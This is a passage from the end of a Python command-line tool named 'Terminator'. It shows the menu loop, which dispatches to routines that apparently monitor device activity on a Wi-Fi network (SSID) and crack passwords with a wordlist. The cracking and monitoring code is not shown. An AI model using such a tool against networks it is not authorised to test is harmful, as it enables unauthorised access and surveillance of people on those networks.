                        duration = input(f"{Fore.YELLOW}[?] Enter monitoring duration in seconds (default 60): {Style.RESET_ALL}")
                        try:
                            duration = int(duration) if duration else 60
                            self.monitor_device_activity(ssid, duration)
                        except ValueError:
                            print(f"{Fore.RED}[!] Invalid duration, using default 60 seconds{Style.RESET_ALL}")
                            self.monitor_device_activity(ssid)
                elif choice == "9":
                    print(f"{Fore.GREEN}[+] Exiting...{Style.RESET_ALL}")
                    sys.exit(0)
                elif choice == "10":
                    self.crack_with_wordlist()
                else:
                    print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")
                
                input(f"\n{Fore.YELLOW}[?] Press Enter to continue...{Style.RESET_ALL}")
                self.clear_screen()
                self.print_banner()
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Program terminated by user{Style.RESET_ALL}")
            sys.exit(0)
        except Exception as e:
            print(f"\n{Fore.RED}[!] An error occurred: {str(e)}{Style.RESET_ALL}")
            sys.exit(1)

if __name__ == "__main__":
    try:
        terminator = Terminator()
        args = sys.argv[1:]
        if args:
            cmd = args[0].lower()
            if cmd in ["info", "--help"]:
                show_command_reference()
            else:
                print(f"{Fore.RED}[!] Unknown command. Use 'info' or '--help' to see available commands.{Style.RESET_ALL}")
        else:
            terminator.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Program terminated by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] An error occurred: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)